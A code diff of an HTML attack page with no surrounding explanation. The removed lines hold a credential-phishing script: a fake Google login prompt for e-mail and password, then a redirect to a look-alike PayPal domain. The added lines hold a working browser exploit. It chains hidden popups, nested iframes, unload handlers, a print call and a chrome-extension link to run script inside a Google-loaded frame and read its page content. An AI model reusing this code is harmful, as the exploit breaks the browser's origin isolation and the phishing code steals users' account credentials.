@@ -1,26 +1,62 @@
-<html>
-  <body>
+<script>
+runAsync = func => chrome.runtime.sendMessage("a", "", {}, func);
 
-    <script>
+waitForWindow = (window, accessible, func) => {
+    var doc;
+    try { doc = window.document } catch (e) { }
+    accessible == !!doc ? func() : runAsync(waitForWindow.bind(null, window, accessible, func));
+} 
 
-    function exploit() {
+document.onclick = function () {
+    document.onclick = null;
 
-      window.open("https://www.google.com");
+    wnd = open("", "", "width=1,height=1");
+    wnd.moveTo(10000, 10000);
 
-      document.getElementById("iframe").src = 'javascript:prompt("In order to access Google.com\\nyou must first login on your\\nGoogle Account.\\n\\nPlease type your e-mail\\nand your password:\\n", "E-mail / Password");';
-      document.location="http://www.manage-myaccount.paypal.com-webapps.bntk.pl";
+    frame = document.body.appendChild(document.createElement("iframe"));
+    frame.contentWindow.name = "xxx";
 
+    frame2 = frame.contentWindow.document.body.appendChild(document.createElement("iframe"));
+    frame2.contentWindow.onunload = function() {
+        frame2.contentWindow.onunload = null;
+
+        runAsync(() => {
+            a = document.createElement("a");
+            a.href = "chrome-extension://mhjfbmdgcfjbbpaeojofohoefgiehjai/index.html";
+            a.target = "xxx";
+            a.click();
+
+            waitForWindow(frame.contentWindow, false, function () {
+                wnd.close();
+            })
+        });
+
+        wnd.print();
     }
-    
-    </script>
+    frame.remove();
 
-    <br><br><br><br>
+    frame.contentWindow.location = "about:blank";
+    frame.onload = function () {
+        frame.contentWindow.location = "https://www.google.com/services/";
 
-    <a href="#" onclick="exploit();">
-      <center><h1>Click here to go to Google.com</h1></center>
-    </a>
+        frame.onload = function() {
+            frame.onload = null;
 
-    <iframe styleframeborder="0" style="width:0;height:0;" id="iframe" src=""></iframe>
+            frame3 = document.body.appendChild(document.createElement("iframe"));
+            frame3.srcdoc = "<b><p><iframe src='javascript:top.insertFrame(frameElement)'></iframe></b></p>";
 
-  </body>
-</html>
+            var count = 0;
+            insertFrame = function (element) {
+                if (++count != 1)
+                    return;
+                var parent = element.parentNode;
+                element.remove();
+                parent.remove();
+                parent.appendChild(frame);
+                frame.src = "javascript:alert(document.documentElement.innerHTML)";
+            }
+        }
+    }
+}
+</script>
+<h1>Click to start</h1>
